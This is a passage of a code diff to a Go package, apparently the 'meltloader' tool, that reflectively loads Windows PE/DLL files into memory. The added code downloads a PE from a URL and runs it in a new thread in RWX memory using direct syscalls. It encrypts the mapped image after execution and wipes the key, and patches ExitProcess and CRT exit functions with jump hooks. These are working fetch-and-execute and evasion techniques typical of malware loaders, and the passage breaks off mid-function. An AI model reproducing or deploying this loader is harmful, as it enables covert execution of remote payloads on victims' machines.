@@ -4,381 +4,191 @@ package pe is responsible for performing reflective loading of PE/DLL files from
 package pe 
 
 import (
-	"bytes"
-	api "github.com/carved4/go-wincall"
-	sys "github.com/carved4/go-native-syscall"
-	"github.com/Binject/debug/pe"
-	"encoding/binary"
-	"fmt"
-	"io/ioutil"
-	"unsafe"
-	"strings"
-	"strconv"
-	"runtime"
-	"runtime/debug"
-)
-const (
-	IMAGE_DIRECTORY_ENTRY_EXPORT    = 0x0
-	IMAGE_DIRECTORY_ENTRY_IMPORT    = 0x1
-	IMAGE_DIRECTORY_ENTRY_BASERELOC = 0x5
-	DLL_PROCESS_ATTACH              = 0x1
-	
-	
-	// Memory constants
-	MEM_COMMIT     = 0x00001000
-	MEM_RESERVE    = 0x00002000
-	MEM_RELEASE    = 0x00008000
-	PAGE_NOACCESS  = 0x01
-	PAGE_EXECUTE_READWRITE = 0x40
-	PAGE_READWRITE = 0x04
-	PAGE_EXECUTE_READ = 0x20
-	PAGE_READONLY = 0x02
-	
-	// SystemFunction / RtlEncryptMemory constants
-	RTL_ENCRYPT_OPTION_SAME_PROCESS   = 0x01
-	RTL_ENCRYPT_OPTION_CROSS_PROCESS  = 0x02
-	RTL_ENCRYPT_OPTION_SAME_LOGON     = 0x04
-	RTL_ENCRYPT_MEMORY_SIZE           = 0x08  // 8 bytes minimum
-	
-	// Thread access rights
-	THREAD_SUSPEND_RESUME = 0x0002
-	THREAD_ALL_ACCESS     = 0x1FFFFF
+    "bytes"
+    api "github.com/carved4/go-wincall"
+    sys "github.com/carved4/go-native-syscall"
+    "github.com/Binject/debug/pe"
+    "github.com/carved4/meltloader/pkg/net"
+    "github.com/carved4/meltloader/pkg/enc"
+    "encoding/binary"
+    "fmt"
+    "io/ioutil" 
+    "unsafe"
+    "strings"
+    "strconv"
+    "runtime"
+    "runtime/debug"
+    "sync"
 )
 
-type ULONGLONG uint64
-
-
-type IMAGE_DOS_HEADER struct {
-	E_magic    uint16
-	E_cblp     uint16
-	E_cp       uint16
-	E_crlc     uint16
-	E_cparhdr  uint16
-	E_minalloc uint16
-	E_maxalloc uint16
-	E_ss       uint16
-	E_sp       uint16
-	E_csum     uint16
-	E_ip       uint16
-	E_cs       uint16
-	E_lfarlc   uint16
-	E_ovno     uint16
-	E_res      [4]uint16
-	E_oemid    uint16
-	E_oeminfo  uint16
-	E_res2     [10]uint16
-	E_lfanew   uint32
+type PEMapping struct {
+    BaseAddress uintptr
+    Size        uintptr
 }
 
-type IMAGE_OPTIONAL_HEADER64 struct {
-	Magic                       uint16
-	MajorLinkerVersion          uint8
-	MinorLinkerVersion          uint8
-	SizeOfCode                  uint32
-	SizeOfInitializedData       uint32
-	SizeOfUninitializedData     uint32
-	AddressOfEntryPoint         uint32
-	BaseOfCode                  uint32
-	ImageBase                   uint64
-	SectionAlignment            uint32
-	FileAlignment               uint32
-	MajorOperatingSystemVersion uint16
-	MinorOperatingSystemVersion uint16
-	MajorImageVersion           uint16
-	MinorImageVersion           uint16
-	MajorSubsystemVersion       uint16
-	MinorSubsystemVersion       uint16
-	Win32VersionValue           uint32
-	SizeOfImage                 uint32
-	SizeOfHeaders               uint32
-	CheckSum                    uint32
-	Subsystem                   uint16
-	DllCharacteristics          uint16
-	SizeOfStackReserve          uint64
-	SizeOfStackCommit           uint64
-	SizeOfHeapReserve           uint64
-	SizeOfHeapCommit            uint64
-	LoaderFlags                 uint32
-	NumberOfRvaAndSizes         uint32
+var (
+    peRegistry = make(map[uintptr]*PEMapping)
+    peRegistryMutex sync.RWMutex
+)
 
-	DataDirectory [16]IMAGE_DATA_DIRECTORY
+// global exit guard hook representation
+type exitHook struct {
+    target    uintptr
+    orig      [16]byte
+    size      uintptr
+    installed bool
 }
 
-type IMAGE_DATA_DIRECTORY struct {
-	VirtualAddress uint32
-	Size           uint32
+// Observed behavior and rationale for exit guards
+// - IAT-only redirection of ExitProcess/TerminateProcess is not sufficient for all payloads;
+//   some resolve exits dynamically (GetProcAddress) or call CRT helpers (exit/_exit/_cexit).
+// - A previous attempt to also hook ntdll-level routines such as RtlExitUserProcess (and
+//   RaiseFailFastException) caused an access violation at process shutdown, as the Go runtime
+//   and OS rely on these for clean finalization.
+// - The solution that proved stable across tests: hook only user-mode/CRT exits (kernel32/
+//   kernelbase ExitProcess/TerminateProcess and MSVC/UCRT exit variants) and leave ntdll
+//   alone. This blocks payload-triggered process termination while allowing the host to exit
+//   normally via RtlExitUserProcess -> NtTerminateProcess when our loader is done.
+// - If a payload explicitly calls ntdll termination APIs, we can add an opt-in guard later,
+//   but reflective payloads typically rely on user-mode exits through the runtime/CRT.
+//
+// installGlobalExitGuards redirects process-exit style APIs to ExitThread via a small x64 stub.
+// It returns the allocated stub and the installed hooks to restore later.
+func installGlobalExitGuards() (stub uintptr, hooks []exitHook, err error) {
+    // Resolve ExitThread address via hash lookup as requested
+    k32 := api.LoadLibraryW("kernel32.dll")
+    if k32 == 0 {
+        return 0, nil, fmt.Errorf("LoadLibraryW(kernel32) failed")
+    }
+    exitThread := api.GetFunctionAddress(k32, api.GetHash("ExitThread"))
+    if exitThread == 0 {
+        return 0, nil, fmt.Errorf("GetFunctionAddress(ExitThread) failed")
+    }
+
+    // Build a tiny stub: sub rsp,0x28; xor rcx,rcx; mov rax, ExitThread; call rax; add rsp,0x28; ret
+    stubCode := []byte{
+        0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
+        0x48, 0x31, 0xC9, // xor rcx, rcx
+        0x48, 0xB8, // mov rax, imm64
+    }
+    // append imm64 ExitThread
+    buf := make([]byte, 8)
+    binary.LittleEndian.PutUint64(buf, uint64(exitThread))
+    stubCode = append(stubCode, buf...)
+    stubCode = append(stubCode,
+        0xFF, 0xD0, // call rax
+        0x48, 0x83, 0xC4, 0x28, // add rsp,0x28
+        0xC3, // ret (should not return)
+    )
+
+    // Allocate RWX memory for stub
+    s, aerr := api.Call("kernel32.dll", "VirtualAlloc", 0, uintptr(len(stubCode)), uintptr(0x3000), uintptr(0x40))
+    if aerr != nil || s == 0 {
+        return 0, nil, fmt.Errorf("VirtualAlloc stub failed: %v", aerr)
+    }
+    stub = s
+    // Copy code
+    dst := (*[^uint32(0)]byte)(unsafe.Pointer(stub))[:len(stubCode):len(stubCode)]
+    copy(dst, stubCode)
+
+    // helper to lookup and hook a target if present
+    addHook := func(mod string, name string) {
+        if mod == "" || name == "" {
+            return
+        }
+        h := api.LoadLibraryW(mod)
+        if h == 0 {
+            return
+        }
+        addr := api.GetFunctionAddress(h, api.GetHash(name))
+        if addr == 0 {
+            return
+        }
+        // write absolute jmp: mov rax, imm64; jmp rax
+        var hk exitHook
+        hk.target = addr
+        hk.size = 12
+        // Save original bytes
+        for i := uintptr(0); i < hk.size; i++ {
+            hk.orig[i] = *(*byte)(unsafe.Pointer(addr + i))
+        }
+        // Make writable
+        var oldProt uint32
+        api.Call("kernel32.dll", "VirtualProtect", addr, uintptr(hk.size), uintptr(0x40), uintptr(unsafe.Pointer(&oldProt)))
+        // Build detour
+        det := []byte{0x48, 0xB8}
+        binary.LittleEndian.PutUint64(buf, uint64(stub))
+        det = append(det, buf...)
+        det = append(det, 0xFF, 0xE0) // jmp rax
+        for i := uintptr(0); i < hk.size; i++ {
+            *(*byte)(unsafe.Pointer(addr + i)) = det[i]
+        }
+        // Restore prot and flush icache
+        api.Call("kernel32.dll", "VirtualProtect", addr, uintptr(hk.size), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
+        proc, _ := api.Call("kernel32.dll", "GetCurrentProcess")
+        api.Call("kernel32.dll", "FlushInstructionCache", proc, addr, uintptr(hk.size))
+        hk.installed = true
+        hooks = append(hooks, hk)
+    }
+
+    // Kernel32/KernelBase (user-mode exits)
+    addHook("kernel32.dll", "ExitProcess")
+    addHook("kernel32.dll", "TerminateProcess")
+    addHook("kernelbase.dll", "ExitProcess")
+    addHook("kernelbase.dll", "TerminateProcess")
+    // Do not hook NTDLL termination paths to allow clean process shutdown
+    // CRT variants
+    addHook("msvcrt.dll", "exit")
+    addHook("msvcrt.dll", "_exit")
+    addHook("msvcrt.dll", "_cexit")
+    addHook("ucrtbase.dll", "exit")
+    addHook("ucrtbase.dll", "_exit")
+    addHook("ucrtbase.dll", "_cexit")
+    addHook("vcruntime140.dll", "_cexit")
+    addHook("vcruntime140_1.dll", "_cexit")
+
+    return stub, hooks, nil
 }
 
-type IMAGE_FILE_HEADER struct {
-	Machine              uint16
-	NumberOfSections     uint16
-	TimeDateStamp        uint32
-	PointerToSymbolTable uint32
-	NumberOfSymbols      uint32
-	SizeOfOptionalHeader uint16
-	Characteristics      uint16
+func uninstallGlobalExitGuards(stub uintptr, hooks []exitHook) {
+    // Restore all hooks
+    for _, hk := range hooks {
+        if !hk.installed || hk.target == 0 || hk.size == 0 {
+            continue
+        }
+        var oldProt uint32
+        api.Call("kernel32.dll", "VirtualProtect", hk.target, uintptr(hk.size), uintptr(0x40), uintptr(unsafe.Pointer(&oldProt)))
+        for i := uintptr(0); i < hk.size; i++ {
+            *(*byte)(unsafe.Pointer(hk.target + i)) = hk.orig[i]
+        }
+        api.Call("kernel32.dll", "VirtualProtect", hk.target, uintptr(hk.size), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
+        proc, _ := api.Call("kernel32.dll", "GetCurrentProcess")
+        api.Call("kernel32.dll", "FlushInstructionCache", proc, hk.target, uintptr(hk.size))
+    }
+    if stub != 0 {
+        api.Call("kernel32.dll", "VirtualFree", stub, 0, uintptr(0x8000))
+    }
 }
 
-type IMAGE_NT_HEADERS64 struct {
-	Signature      uint32
-	FileHeader     IMAGE_FILE_HEADER
-	OptionalHeader IMAGE_OPTIONAL_HEADER64
-}
-
-type IMAGE_NT_HEADERS struct {
-	Signature      uint32
-	FileHeader     IMAGE_FILE_HEADER
-	OptionalHeader IMAGE_OPTIONAL_HEADER64
-}
-
-type IMAGE_SECTION_HEADER struct {
-	Name                 [8]byte
-	VirtualSize          uint32
-	VirtualAddress       uint32
-	SizeOfRawData        uint32
-	PointerToRawData     uint32
-	PointerToRelocations uint32
-	PointerToLinenumbers uint32
-	NumberOfRelocations  uint16
-	NumberOfLinenumbers  uint16
-	Characteristics      uint32
-}
-
-type BASE_RELOCATION_BLOCK struct {
-	PageAddress uint32
-	BlockSize   uint32
-}
-
-type BASE_RELOCATION_ENTRY struct {
-	OffsetType uint16
-}
-
-func (bre BASE_RELOCATION_ENTRY) Offset() uint16 {
-	return bre.OffsetType & 0xFFF
-}
-
-func (bre BASE_RELOCATION_ENTRY) Type() uint16 {
-	return (bre.OffsetType >> 12) & 0xF
-}
-
-type IMAGE_IMPORT_DESCRIPTOR struct {
-	Characteristics     uint32
-	TimeDateStamp       uint32
-	ForwarderChain      uint32
-	Name                uint32
-	FirstThunk          uint32
-	OriginalFirstThunk  uint32
-}
-
-type IMAGE_EXPORT_DIRECTORY struct {
-	Characteristics       uint32
-	TimeDateStamp         uint32
-	MajorVersion          uint16
-	MinorVersion          uint16
-	Name                  uint32
-	Base                  uint32
-	NumberOfFunctions     uint32
-	NumberOfNames         uint32
-	AddressOfFunctions    uint32
-	AddressOfNames        uint32
-	AddressOfNameOrdinals uint32
-}
-
-type IMAGE_BASE_RELOCATION struct {
-	VirtualAddress uint32
-	SizeOfBlock    uint32
-}
-
-type ImageThunkData64 struct {
-	AddressOfData uintptr
-}
-
-type ImageThunkData = ImageThunkData64
-type OriginalImageThunkData = ImageThunkData64
-
-type ImageReloc struct {
-	Data uint16
-}
-
-func (r *ImageReloc) GetType() uint16 {
-	return (r.Data >> 12) & 0xF
-}
-
-func (r *ImageReloc) GetOffset() uint16 {
-	return r.Data & 0xFFF
-}
-
-// VEH Exception handling structures (future)
-type EXCEPTION_RECORD struct {
-	ExceptionCode        uint32
-	ExceptionFlags       uint32
-	ExceptionRecord      *EXCEPTION_RECORD
-	ExceptionAddress     uintptr
-	NumberParameters     uint32
-	ExceptionInformation [15]uintptr
-}
-
-type EXCEPTION_POINTERS struct {
-	ExceptionRecord *EXCEPTION_RECORD
-	ContextRecord   *CONTEXT
-}
-
-func NtH(baseAddress uintptr) *IMAGE_NT_HEADERS {
-	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(baseAddress))
-	return (*IMAGE_NT_HEADERS)(unsafe.Pointer(baseAddress + uintptr(dosHeader.E_lfanew)))
-}
-
-func CstrVal(ptr unsafe.Pointer) []byte {
-	var result []byte
-	for i := 0; ; i++ {
-		b := *(*byte)(unsafe.Pointer(uintptr(ptr) + uintptr(i)))
-		if b == 0 {
-			break
-		}
-		result = append(result, b)
+func createPEMapping(baseAddress uintptr, size uintptr) *PEMapping {
+	mapping := &PEMapping{
+		BaseAddress: baseAddress,
+		Size:        size,
 	}
-	return result
+	
+	peRegistryMutex.Lock()
+	peRegistry[baseAddress] = mapping
+	peRegistryMutex.Unlock()
+	
+	return mapping
 }
 
-func IsMSBSet(value uintptr) bool {
-	return (value & 0x8000000000000000) != 0
+func unregisterPE(baseAddress uintptr) {
+	peRegistryMutex.Lock()
+	delete(peRegistry, baseAddress)
+	peRegistryMutex.Unlock()
 }
 
-func ParseOrdinal(addressOfData uintptr) (unsafe.Pointer, string) {
-	ord := uint16(addressOfData & 0xFFFF)
-	return unsafe.Pointer(uintptr(ord)), fmt.Sprintf("#%d", ord)
-}
-
-func ParseFuncAddress(baseAddress uintptr, addressOfData uintptr) (unsafe.Pointer, string) {
-	nameAddr := baseAddress + addressOfData + 2 // Skip hint
-	nameBytes := CstrVal(unsafe.Pointer(nameAddr))
-	return unsafe.Pointer(nameAddr), string(nameBytes)
-}
-
-
-func GetRelocTable(ntHeaders *IMAGE_NT_HEADERS) *IMAGE_DATA_DIRECTORY {
-	if ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0 {
-		return nil
-	}
-	return &ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
-}
-
-func Memcpy(dst, src uintptr, size uintptr) {
-	srcSlice := (*[^uint32(0)]byte)(unsafe.Pointer(src))[:size:size]
-	dstSlice := (*[^uint32(0)]byte)(unsafe.Pointer(dst))[:size:size]
-	copy(dstSlice, srcSlice)
-}
-
-func Memset(ptr uintptr, value byte, size uintptr) {
-	slice := (*[^uint32(0)]byte)(unsafe.Pointer(ptr))[:size:size]
-	for i := range slice {
-		slice[i] = value
-	}
-}
-
-func Contains(slice []string, item string) bool {
-	for _, s := range slice {
-		if s == item {
-			return true
-		}
-	}
-	return false
-}
-
-type M128A struct {
-	Low  uint64
-	High int64
-}
-
-type CONTEXT struct {
-	P1Home               uint64
-	P2Home               uint64
-	P3Home               uint64
-	P4Home               uint64
-	P5Home               uint64
-	P6Home               uint64
-	ContextFlags         uint32
-	MxCsr                uint32
-	SegCs                uint16
-	SegDs                uint16
-	SegEs                uint16
-	SegFs                uint16
-	SegGs                uint16
-	SegSs                uint16
-	EFlags               uint32
-	Dr0                  uint64
-	Dr1                  uint64
-	Dr2                  uint64
-	Dr3                  uint64
-	Dr6                  uint64
-	Dr7                  uint64
-	Rax                  uint64
-	Rcx                  uint64
-	Rdx                  uint64
-	Rbx                  uint64
-	Rsp                  uint64
-	Rbp                  uint64
-	Rsi                  uint64
-	Rdi                  uint64
-	R8                   uint64
-	R9                   uint64
-	R10                  uint64
-	R11                  uint64
-	R12                  uint64
-	R13                  uint64
-	R14                  uint64
-	R15                  uint64
-	Rip                  uint64
-	VectorRegister       [26]M128A
-	VectorControl        uint64
-	DebugControl         uint64
-	LastBranchToRip      uint64
-	LastBranchFromRip    uint64
-	LastExceptionToRip   uint64
-	LastExceptionFromRip uint64
-}
-
-type UString struct {
-	Length        uint32
-	MaximumLength uint32
-	Buffer        *byte // This corresponds to PUCHAR in C
-}
-
-
-type CLIENT_ID struct {
-	UniqueProcess uintptr
-	UniqueThread  uintptr
-}
-
-
-type PROCESS_INFORMATION struct {
-	HProcess    uintptr
-	HThread     uintptr
-	ProcessId   uint32
-	ThreadId    uint32
-}
-
-
-type STARTUPINFO struct {
-	Cb              uint32
-	LpReserved      *uint16
-	LpDesktop       *uint16
-	LpTitle         *uint16
-	X               uint32
-	Y               uint32
-	XSize           uint32
-	YSize           uint32
-	XCountChars     uint32
-	YCountChars     uint32
-	FillAttribute   uint32
-	Flags           uint32
-	ShowWindow      uint16
-	CbReserved2     uint16
-	LpReserved2     *byte
-	HStdInput       uintptr
-	HStdOutput      uintptr
-	HStdError       uintptr
-}
 //go:nosplit
 //go:noinline
 func GetPEB() uintptr
@@ -501,53 +311,64 @@ func checkForwardedExportByName(moduleHandle unsafe.Pointer, functionName string
 	return 0, false
 }
 
-func LoadPEFromBytes(peBytes []byte) error {
+func LoadPEFromBytes(peBytes []byte) (*PEMapping, error) {
 	if len(peBytes) == 0 {
-		return fmt.Errorf("[ERROR] empty PE bytes provided")
+		return nil, fmt.Errorf("[ERROR] empty PE bytes provided")
 	}
 	
 	return peLoader(&peBytes)
 }
 
-func LoadPEFromFile(filePath string) error {
+func LoadPEFromURLThreadTimed(url string, timeoutSeconds int) (*PEMapping, error) {
+	if url == "" {
+		return nil, fmt.Errorf("[ERROR] empty URL provided")
+	}
+	buff, err := net.DownloadToMemory(url)
+	if err != nil {
+		return nil, fmt.Errorf("[ERROR] failed to download PE from URL: %v", err)
+	}
+	return LoadPEFromBytesWithThreadTimed(buff, timeoutSeconds)
+}
+
+func LoadPEFromFile(filePath string) (*PEMapping, error) {
 	peBytes, err := ioutil.ReadFile(filePath)
 	if err != nil {
-		return fmt.Errorf("[ERROR] failed to read PE file: %v", err)
+		return nil, fmt.Errorf("[ERROR] failed to read PE file: %v", err)
 	}
 	
 	return LoadPEFromBytes(peBytes)
 }
 
-func LoadPEFromBytesWithThread(peBytes []byte) error {
+func LoadPEFromBytesWithThread(peBytes []byte) (*PEMapping, error) {
 	if len(peBytes) == 0 {
-		return fmt.Errorf("[ERROR] empty PE bytes provided")
+		return nil, fmt.Errorf("[ERROR] empty PE bytes provided")
 	}
 	
 	return peThreadLoader(&peBytes, 2) // Default 2 seconds
 }
 
-func LoadPEFromFileWithThread(filePath string) error {
+func LoadPEFromFileWithThread(filePath string) (*PEMapping, error) {
 	peBytes, err := ioutil.ReadFile(filePath)
 	if err != nil {
-		return fmt.Errorf("[ERROR] failed to read PE file: %v", err)
+		return nil, fmt.Errorf("[ERROR] failed to read PE file: %v", err)
 	}
 	
 	return peThreadLoader(&peBytes, 2) // Default 2 seconds
 }
 
-func LoadPEFromBytesWithThreadTimed(peBytes []byte, timeoutSeconds int) error {
+func LoadPEFromBytesWithThreadTimed(peBytes []byte, timeoutSeconds int) (*PEMapping, error) {
 	if len(peBytes) == 0 {
-		return fmt.Errorf("[ERROR] empty PE bytes provided")
+		return nil, fmt.Errorf("[ERROR] empty PE bytes provided")
 	}
 	
 	return peThreadLoader(&peBytes, timeoutSeconds)
 }
 
 
-func LoadPEFromFileWithThreadTimed(filePath string, timeoutSeconds int) error {
+func LoadPEFromFileWithThreadTimed(filePath string, timeoutSeconds int) (*PEMapping, error) {
 	peBytes, err := ioutil.ReadFile(filePath)
 	if err != nil {
-		return fmt.Errorf("[ERROR] failed to read PE file: %v", err)
+		return nil, fmt.Errorf("[ERROR] failed to read PE file: %v", err)
 	}
 	
 	fmt.Printf("[+] Loading %s with %d second timeout for user interaction\n", filePath, timeoutSeconds)
@@ -743,10 +564,10 @@ func CopySections(pefile *pe.File, image *[]byte, loc uintptr) error {
 	return nil
 }
 
-func peLoader(bytes0 *[]byte) error {
+func peLoader(bytes0 *[]byte) (*PEMapping, error) {
 	
 	if len(*bytes0) < 64 {
-		return fmt.Errorf("[ERROR] PE file too small (less than 64 bytes)")
+		return nil, fmt.Errorf("[ERROR] PE file too small (less than 64 bytes)")
 	}
 	
 	defer runtime.UnlockOSThread()
@@ -755,6 +576,12 @@ func peLoader(bytes0 *[]byte) error {
 	
 	oldGCPercent := debug.SetGCPercent(-1)
 	defer debug.SetGCPercent(oldGCPercent)
+	
+	// generate encryption key for the mapped PE
+	encKey, err := enc.GenerateKey(32)
+	if err != nil {
+		return nil, fmt.Errorf("[ERROR] failed to generate encryption key: %v", err)
+	}
 	
 	pinnedBytes := make([]byte, len(*bytes0))
 	copy(pinnedBytes, *bytes0)
@@ -768,17 +595,17 @@ func peLoader(bytes0 *[]byte) error {
 	baseAddr := uintptr(unsafe.Pointer(&pinnedBytes[0]))
 	
 	if baseAddr == 0 {
-		return fmt.Errorf("[ERROR] invalid base address")
+		return nil, fmt.Errorf("[ERROR] invalid base address")
 	}
 	
 	tgtFile := NtH(baseAddr)
 	if tgtFile == nil {
-		return fmt.Errorf("[ERROR] invalid PE file - cannot parse NT headers")
+		return nil, fmt.Errorf("[ERROR] invalid PE file - cannot parse NT headers")
 	}
 
 	peF, err := pe.NewFile(bytes.NewReader(pinnedBytes))
 	if err != nil {
-		return fmt.Errorf("[ERROR] failed to parse PE file: %v", err)
+		return nil, fmt.Errorf("[ERROR] failed to parse PE file: %v", err)
 	}
 	
 	relocTable := GetRelocTable(tgtFile)
@@ -796,7 +623,7 @@ func peLoader(bytes0 *[]byte) error {
 	status, err = sys.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)
 
 	if status != 0 && relocTable == nil {
-		return fmt.Errorf("[ERROR] no relocation table and cannot load to preferred address (status: 0x%x)", status)
+		return nil, fmt.Errorf("[ERROR] no relocation table and cannot load to preferred address (status: 0x%x)", status)
 	}
 	
 	if status != 0 && relocTable != nil {
@@ -805,9 +632,17 @@ func peLoader(bytes0 *[]byte) error {
 		status, err = sys.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)
 
 		if status != 0 {
-			return fmt.Errorf("[ERROR] cannot allocate memory for PE (status: 0x%x, err: %v)", status, err)
+			return nil, fmt.Errorf("[ERROR] cannot allocate memory for PE (status: 0x%x, err: %v)", status, err)
 		}
 	}
+
+	// defer encryption of the mapped PE after execution
+	defer func() {
+		// create a byte slice that points to the mapped PE memory
+		mappedPE := (*[1 << 30]byte)(unsafe.Pointer(imageBaseForPE))[:regionSize:regionSize]
+		enc.EncryptBuffer(&mappedPE, encKey)
+		enc.SecureWipeBuffer(&encKey) // wipe the encryption key from memory
+	}()
 
 	headersSize := tgtFile.OptionalHeader.SizeOfHeaders
 	copy((*[1 << 30]byte)(unsafe.Pointer(imageBaseForPE))[:headersSize], pinnedBytes[:headersSize])
@@ -816,31 +651,31 @@ func peLoader(bytes0 *[]byte) error {
 	mappedNtHeader := (*IMAGE_NT_HEADERS)(unsafe.Pointer(imageBaseForPE + uintptr(mappedDosHeader.E_lfanew)))
 	
 	if mappedNtHeader.Signature != 0x4550 {
-		return fmt.Errorf("[ERROR] invalid NT Signature: 0x%x", mappedNtHeader.Signature)
+		return nil, fmt.Errorf("[ERROR] invalid NT Signature: 0x%x", mappedNtHeader.Signature)
 	}
 	
 	tgtFile.OptionalHeader.ImageBase = uint64(imageBaseForPE)
 	mappedNtHeader.OptionalHeader.ImageBase = uint64(imageBaseForPE)
 
 	if err := CopySections(peF, &pinnedBytes, imageBaseForPE); err != nil {
-		return fmt.Errorf("[ERROR] failed to copy sections: %v", err)
+		return nil, fmt.Errorf("[ERROR] failed to copy sections: %v", err)
 	}
 
 	if err := fixImportAddressTable(imageBaseForPE, peF); err != nil {
-		return fmt.Errorf("[ERROR] failed to fix import address table: %v", err)
+		return nil, fmt.Errorf("[ERROR] failed to fix import address table: %v", err)
 	}
 
 	if imageBaseForPE != uintptr(preferableAddress) {
 		if relocTable != nil {
 			if err := fixRelocTable(imageBaseForPE, uintptr(preferableAddress), (*IMAGE_DATA_DIRECTORY)(unsafe.Pointer(relocTable))); err != nil {
-				return fmt.Errorf("[ERROR] failed to fix relocation table: %v", err)
+				return nil, fmt.Errorf("[ERROR] failed to fix relocation table: %v", err)
 			}
 		}
 	}
 	
 	entryPointRVA := mappedNtHeader.OptionalHeader.AddressOfEntryPoint
 	
-	startAddress := imageBaseForPE + uintptr(entryPointRVA)
+    startAddress := imageBaseForPE + uintptr(entryPointRVA)
 
 	Memset(baseAddr, 0, uintptr(len(pinnedBytes)))
 	
@@ -848,11 +683,18 @@ func peLoader(bytes0 *[]byte) error {
 	runtime.KeepAlive(bytes0)
 	runtime.KeepAlive(&pinnedBytes[0])
 	
-	var threadHandle uintptr
-	status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
-	if status != 0 {
-		return fmt.Errorf("[ERROR] failed to create thread (status: 0x%x, err: %v)", status, err)
-	}
+    // Guard against process-exit calls globally (install then remove after thread end)
+    stub, hooks, ierr := installGlobalExitGuards()
+    if ierr != nil {
+        // non-fatal, continue without global guards
+    }
+    defer func() { uninstallGlobalExitGuards(stub, hooks) }()
+    var threadHandle uintptr
+    status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
+    if status != 0 {
+        uninstallGlobalExitGuards(stub, hooks)
+        return nil, fmt.Errorf("[ERROR] failed to create thread (status: 0x%x, err: %v)", status, err)
+    }
 
 	runtime.KeepAlive(pinnedBytes)
 	runtime.KeepAlive(bytes0)
@@ -865,22 +707,23 @@ func peLoader(bytes0 *[]byte) error {
 	} else if status == 0x00000102 {
 		status = 0
 	} else {
-		return fmt.Errorf("[ERROR] thread execution failed with status: 0x%x", status)
+		return nil, fmt.Errorf("[ERROR] thread execution failed with status: 0x%x", status)
 	}
 	
 	runtime.KeepAlive(pinnedBytes)
 	runtime.KeepAlive(bytes0)
 	runtime.KeepAlive(&pinnedBytes[0])
 	
-	sys.NtClose(threadHandle)
+    sys.NtClose(threadHandle)
 	
-	return nil	
+	mapping := createPEMapping(imageBaseForPE, regionSize)
+	return mapping, nil	
 }
 
-func peThreadLoader(bytes0 *[]byte, timeoutSeconds int) error {
+func peThreadLoader(bytes0 *[]byte, timeoutSeconds int) (*PEMapping, error) {
 	
 	if len(*bytes0) < 64 {
-		return fmt.Errorf("[ERROR] PE file too small (less than 64 bytes)")
+		return nil, fmt.Errorf("[ERROR] PE file too small (less than 64 bytes)")
 	}
 	
 	runtime.LockOSThread()
@@ -890,6 +733,12 @@ func peThreadLoader(bytes0 *[]byte, timeoutSeconds int) error {
 	
 	oldGCPercent := debug.SetGCPercent(-1)
 	defer debug.SetGCPercent(oldGCPercent)
+	
+	// generate encryption key for the mapped PE
+	encKey, err := enc.GenerateKey(32)
+	if err != nil {
+		return nil, fmt.Errorf("[ERROR] failed to generate encryption key: %v", err)
+	}
 	
 	pinnedBytes := make([]byte, len(*bytes0))
 	copy(pinnedBytes, *bytes0)
@@ -903,17 +752,17 @@ func peThreadLoader(bytes0 *[]byte, timeoutSeconds int) error {
 	baseAddr := uintptr(unsafe.Pointer(&pinnedBytes[0]))
 	
 	if baseAddr == 0 {
-		return fmt.Errorf("[ERROR] invalid base address")
+		return nil, fmt.Errorf("[ERROR] invalid base address")
 	}
 	
 	tgtFile := NtH(baseAddr)
 	if tgtFile == nil {
-		return fmt.Errorf("[ERROR] invalid PE file - cannot parse NT headers")
+		return nil, fmt.Errorf("[ERROR] invalid PE file - cannot parse NT headers")
 	}
 
 	peF, err := pe.NewFile(bytes.NewReader(pinnedBytes))
 	if err != nil {
-		return fmt.Errorf("[ERROR] failed to parse PE file: %v", err)
+		return nil, fmt.Errorf("[ERROR] failed to parse PE file: %v", err)
 	}
 	
 	relocTable := GetRelocTable(tgtFile)
@@ -928,7 +777,7 @@ func peThreadLoader(bytes0 *[]byte, timeoutSeconds int) error {
 	status, err := sys.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)
 
 	if status != 0 && relocTable == nil {
-		return fmt.Errorf("[ERROR] no relocation table and cannot load to preferred address (status: 0x%x)", status)
+		return nil, fmt.Errorf("[ERROR] no relocation table and cannot load to preferred address (status: 0x%x)", status)
 	}
 	
 	if status != 0 && relocTable != nil {
@@ -937,9 +786,17 @@ func peThreadLoader(bytes0 *[]byte, timeoutSeconds int) error {
 		status, err = sys.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)
 
 		if status != 0 {
-			return fmt.Errorf("[ERROR] cannot allocate memory for PE (status: 0x%x, err: %v)", status, err)
+			return nil, fmt.Errorf("[ERROR] cannot allocate memory for PE (status: 0x%x, err: %v)", status, err)
 		}
 	}
+
+	// defer encryption of the mapped PE after execution
+	defer func() {
+		// create a byte slice that points to the mapped PE memory
+		mappedPE := (*[1 << 30]byte)(unsafe.Pointer(imageBaseForPE))[:regionSize:regionSize]
+		enc.EncryptBuffer(&mappedPE, encKey)
+		enc.SecureWipeBuffer(&encKey) // wipe the encryption key from memory
+	}()
 
 	headersSize := tgtFile.OptionalHeader.SizeOfHeaders
 	copy((*[1 << 30]byte)(unsafe.Pointer(imageBaseForPE))[:headersSize], pinnedBytes[:headersSize])
@@ -948,118 +805,95 @@ func peThreadLoader(bytes0 *[]byte, timeoutSeconds int) error {
 	mappedNtHeader := (*IMAGE_NT_HEADERS)(unsafe.Pointer(imageBaseForPE + uintptr(mappedDosHeader.E_lfanew)))
 	
 	if mappedNtHeader.Signature != 0x4550 {
-		return fmt.Errorf("[ERROR] invalid NT Signature: 0x%x", mappedNtHeader.Signature)
+		return nil, fmt.Errorf("[ERROR] invalid NT Signature: 0x%x", mappedNtHeader.Signature)
 	}
 	
